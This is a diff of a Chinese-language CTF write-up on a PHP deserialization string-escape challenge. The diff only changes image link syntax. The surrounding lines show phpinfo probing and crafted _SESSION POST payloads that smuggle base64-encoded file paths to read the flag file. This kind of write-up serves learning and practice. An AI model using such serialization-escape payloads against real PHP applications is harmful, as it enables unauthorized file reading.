@@ -1,9 +1,9 @@
-![[Pasted image 20221119110645.png]]
+![](<./img/Pasted image 20221119110645.png>)
 
 ---
 首页长这样
 
-![[Pasted image 20221119110705.png]]
+![](<./img/Pasted image 20221119110705.png>)
 
 ---
 点开之后是源码
@@ -56,7 +56,7 @@ if($function == 'highlight_file'){
 /?f=phpinfo
 ```
 
-![[Pasted image 20221119113417.png]]
+![](<./img/Pasted image 20221119113417.png>)
 
 果不其然发现了存放`flag`的文件名`
 
@@ -67,13 +67,13 @@ if($function == 'highlight_file'){
 
 部署到本地再加了两句
 
-![[Pasted image 20221119212823.png]]
+![](<./img/Pasted image 20221119212823.png>)
 ```php
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:3:"abc";}
 ```
 不得不吐槽php这语言各方面都好宽松QwQ
 
-![[Pasted image 20221119212806.png]]
+![](<./img/Pasted image 20221119212806.png>)
 
 ---
 放靶机上跑去
@@ -86,12 +86,12 @@ POST
 ```php
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
 ```
-![[Pasted image 20221119213410.png]]
+![](<./img/Pasted image 20221119213410.png>)
 
 再来一步
 ```php
 _SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 ```
-![[Pasted image 20221119213746.png]]
+![](<./img/Pasted image 20221119213746.png>)
 
 #Web #PHP #反序列化 #字符串逃逸
